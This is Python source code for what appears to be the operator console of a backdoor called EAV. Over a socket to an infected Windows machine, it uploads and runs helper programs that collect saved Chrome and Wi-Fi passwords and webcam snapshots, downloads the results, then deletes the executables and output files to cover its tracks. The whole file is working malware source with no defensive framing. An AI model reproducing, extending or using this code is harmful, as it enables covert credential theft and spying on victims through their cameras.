#!/usr/bin/python
import subprocess, datetime, base64, socket, json, time, sys

class EAV:
	def __init__(self, connection):
		self.connection = connection
		self.get_user()

	def send_data(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def recv_data(self):
		json_data = ""
		while(1):
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				pass

	def read_file(self, path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path,'wb') as file:
			file.write(base64.b64decode(content))

	def get_user(self):
		self.send_data(["whoami"])
		self.user = self.recv_data()

# Upload Run Delete
	def urd(self, vector, path, exe, output):
		self.send_data(["upload",path,self.read_file(path)])
		self.recv_data()
		self.send_data(["cd","%temp%"])
		self.recv_data()
		self.send_data(["run", exe])
		self.recv_data()
		self.send_data(["download", output])
		result = self.recv_data()
		self.write_file("/root/Desktop/Backdoor-Tools/EAV/"+vector+"/"+self.username+"/"+output, result)
		self.send_data(["del",output+";","del", exe])
		self.recv_data()

# Vectors
	def passwords(self):
		subprocess.call("mkdir /root/Desktop/Backdoor-Tools/EAV/passwords/"+self.username+" > /dev/null 2>&1",shell=True)
	# Chrome Passwords
		print("\033[94m [+] \033[39mFetching chrome passwords...")
		self.urd("passwords","/root/Desktop/Backdoor-Tools/EAV/vectors/get_chrome.exe","get_chrome.exe","chrome.txt")
	# Wifi Passwords
		print("\033[94m [+] \033[39mFetching wifi passwords...")
		self.urd("passwords","/root/Desktop/Backdoor-Tools/EAV/vectors/get_wifi.exe","get_wifi.exe","wifi.txt")
	# All passwords collected
		print("\033[92m [+] \033[39mCollected passwords stored in \'/root/Desktop/Backdoor-Tools/EAV/passwords/"+self.username+"\'\n")

	def webcam(self):
		subprocess.call("mkdir /root/Desktop/Backdoor-Tools/EAV/webcam/"+self.username+" > /dev/null 2>&1",shell=True)
	# Screenshot
		print("\033[94m [+] \033[39mTaking snapshot...")
		self.urd("webcam","/root/Desktop/Backdoor-Tools/EAV/vectors/get_webcam.exe","get_webcam.exe","webcam.jpg")
		print("\033[92m [+] \033[39mSnapshot stored in \'/root/Desktop/Backdoor-Tools/EAV/webcam/"+self.username+"\'\n")
	# Video Stream

	def audio(self):
	# Audio Stream
		pass

	def options(self):
		print("\n\t[passwords]\n\t[webcam]\n\t[microphone]\n")
